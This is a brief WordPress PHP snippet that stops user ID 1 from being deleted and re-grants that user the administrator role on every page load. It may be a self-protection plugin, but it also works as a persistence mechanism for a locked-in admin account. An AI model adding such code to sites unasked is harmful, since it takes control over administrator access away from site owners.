
  define('PDDM_USER_ID', 1);


  function f9_nda($id) {
    if($id == PDDM_USER_ID) {
      die('please don\'t delete me!');
    }
  }

  function f9_adminrole() {
    $user = get_user_by('id', PDDM_USER_ID);
    $user->add_role('administrator');
  }

  add_action('delete_user', 'f9_nda');
  add_action('init',  'f9_adminrole');


